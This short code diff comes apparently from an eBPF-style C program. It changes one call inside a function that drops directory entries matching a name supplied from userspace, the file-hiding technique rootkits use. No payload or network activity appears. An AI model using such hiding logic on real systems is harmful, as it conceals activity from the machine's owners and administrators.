@@ -49,7 +49,7 @@ int patch_dirent_if_found(u32 _, struct dirents_data_t *data)
    int max_str_len = get_str_max_len(userspace_data->dirname_to_hide, dirname, userspace_data->dirname_len);
 
    if (is_dirname_to_hide(max_str_len, dirname, userspace_data->dirname_to_hide)) {
-      data->patch_succeded = remove_curr_dirent(dirname, data);
+      data->patch_succeded = remove_curr_dirent(data);
       return 1;
    }
 
